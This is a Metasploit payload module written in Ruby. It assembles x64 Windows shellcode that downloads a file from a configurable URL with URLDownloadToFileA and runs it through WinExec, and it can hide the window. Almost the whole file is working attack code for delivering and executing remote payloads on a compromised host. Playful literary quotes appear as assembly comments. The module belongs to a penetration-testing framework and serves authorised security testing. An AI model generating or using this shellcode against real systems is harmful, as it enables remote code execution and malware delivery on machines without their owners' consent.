##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

    include Msf::Payload::Single
    include Msf::Payload::Windows
    include Msf::Payload::Windows::BlockApi_x64

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name' => 'Windows Download Execute',
                'Description' => 'Downloads and executes the file from the specified url.',
                'Author' => 'Muzaffer Umut ŞAHİN <mailatmayinlutfen@gmail.com>',
                'License' => MSF_LICENSE,
                'Platform' => 'win',
                'Arch' => ARCH_X64
            )
        )

        display_options = ['HIDE', 'SHOW']

        register_options(
            [
                OptString.new('URL', [true, 'The url to download the file from.', 'https://i.pinimg.com/736x/dd/89/7b/dd897badebe41af82f7b0a7a64be3272.jpg']),
                OptString.new('FILEPATH', [true, 'The path to save the downloaded file.', 'fox.jpg']),
                OptEnum.new('DISPLAY', [true, 'The Display type.', display_options[0], display_options])
            ]
        )
        end

    def generate(_opts={})

        url =  (datastore['URL'] || 'https://i.pinimg.com/736x/dd/89/7b/dd897badebe41af82f7b0a7a64be3272.jpg')
        file = (datastore['FILEPATH'] || 'fox.jpg')
        display = (datastore['DISPLAY'] || 'HIDE')


        payload = %^
            cld
            and rsp, -16 
            call main
            #{asm_block_api}

        main:
            pop rbp  
            call LoadLibrary
            db "urlmon.dllK"
            ; V, is this the land of do-as-you-please?

        LoadLibrary:
            pop rcx ; rcx points to the dll name.
            xor byte [rcx+10], 'K' ; null terminator
            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll','LoadLibraryA')}
            call rbp ; LoadLibraryA("urlmon.dll")
            ; To live alone one must be an animal or a god, says Aristotle. There is yet a third case: one must be both--a philosopher.
        
        SetUrl:
            call SetFile
            db "#{url}A"
            ; The Sound of Silence maybe a Careless Whisper?
        
        SetFile:
            pop rdx ; 2nd argument 
            xor byte [rdx+#{url.length}], 'A' ; null terminator
            call UrlDownloadToFile
            db "#{file}C"
            ; Never compromise not even in the face of armageddon.
            
        UrlDownloadToFile:
            pop r8 ; 3rd argument
            xor byte [r8+#{file.length}], 'C' ; null terminator
            xor rcx,rcx ; 1st argument
            xor r9,r9   ; 4th argument
            mov qword [rsp+0x30], rcx ; 5th argument
            mov r10d, #{Rex::Text.block_api_hash('urlmon.dll','URLDownloadToFileA')}
            call rbp
            ; I can see the sun, but even if I cannot see the sun, I know that it exists. And to know that the sun is there - that is living.
        
        SetCommand:
            call Exec
            db "cmd /c #{file}F"
        
        Exec:
            pop rcx ; 1st argument
            xor byte [rcx+#{file.length + 7 }], 'F' ; null terminator 
            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll','WinExec')}
            xor rdx, rdx ; 2nd argument
        ^

        if display == 'HIDE'
            hide = %^
            call rbp
            ; I am vengeance! I am the night! I am Batman!
            ^
            payload << hide

        elsif display == 'SHOW'
            show = %^
            inc rdx ; SW_NORMAL = 1
            call rbp
            ; It's our only home. Our heaven and our hell. This is Outer Heaven.
            ^
            payload << show
        end

        if datastore['EXITFUNC'] == 'process'
            exit_asm = %^
            xor rcx,rcx
            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll','ExitProcess')}
            call rbp
            ^
            payload << exit_asm
        
        elsif datastore['EXITFUNC'] == 'thread'
            exit_asm = %^
            xor rcx,rcx
            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll','ExitThread')}
            call rbp
            ; She walks in beauty, like the night...
            ^
            payload << exit_asm
        end    

        Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
    end
end
